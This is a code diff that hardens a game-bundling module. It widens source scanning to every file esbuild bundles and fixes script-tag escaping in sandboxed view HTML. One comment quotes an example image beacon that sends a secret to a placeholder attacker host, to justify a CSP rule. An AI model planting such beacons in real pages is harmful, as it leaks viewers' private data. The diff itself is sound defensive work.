@@ -69,7 +69,25 @@ interface IndexEntry {
 }
 
 async function bundle(entryFile: string): Promise<string> {
+  return (await bundleGameWithInputs(entryFile)).js
+}
+
+/**
+ * The same bundle, plus the files that actually went into it.
+ *
+ * `validate-games` scans exactly this list rather than a directory. Scanning
+ * `games/<slug>/src/` made the source gate OPT-IN: `entry` is only required to
+ * exist, so a game whose logic sits at the package root, or under `lib/`, was
+ * never checked for `Date.now` / `Math.random` / `eval` at all — and a game's
+ * output becomes credits. esbuild's graph is the only definition of "the code
+ * that settles a match" an author cannot step around. (This mirrors
+ * `bundleWorldWithInputs`, where the same hole was closed first.)
+ */
+export async function bundleGameWithInputs(
+  entryFile: string,
+): Promise<{ js: string; inputs: string[] }> {
   const out = await esbuild.build({
+    metafile: true,
     entryPoints: [entryFile],
     bundle: true,
     format: 'iife',
@@ -82,7 +100,10 @@ async function bundle(entryFile: string): Promise<string> {
   })
   const text = out.outputFiles?.[0]?.text
   if (!text) throw new Error(`esbuild produced no output for ${entryFile}`)
-  return text
+  // metafile keys are cwd-relative; resolve so a caller can read them from
+  // wherever it was invoked.
+  const inputs = Object.keys(out.metafile?.inputs ?? {}).map((p) => path.resolve(p))
+  return { js: text, inputs }
 }
 
 /** Bundle an author view entry to inline JS (self-runs onFrame at load). */
@@ -104,7 +125,11 @@ export async function bundleView(entryFile: string): Promise<string> {
 
 /** Wrap author view JS in a self-contained, CSP-locked HTML doc (loaded into a sandbox iframe). */
 export function viewHtml(js: string): string {
-  const safe = js.replace(/<\/script>/gi, '<\\/script>')
+  // `</script` closes the element when followed by whitespace, `/` or `>`, so
+  // matching the whole `</script>` missed `</script foo>` and `</script\n>` —
+  // both of which end the tag early and spill the bundle into the document as
+  // markup. Match the opening of the end tag and leave the terminator alone.
+  const safe = js.replace(/<\/(script)/gi, '<\\/$1')
   // img-src is data: ONLY (no https:). An `<img src="https://attacker/?secret">`
   // beacon is an outbound channel out of the browser even though connect-src is
   // 'none' — the request still leaves with the URL, carrying the viewer's private
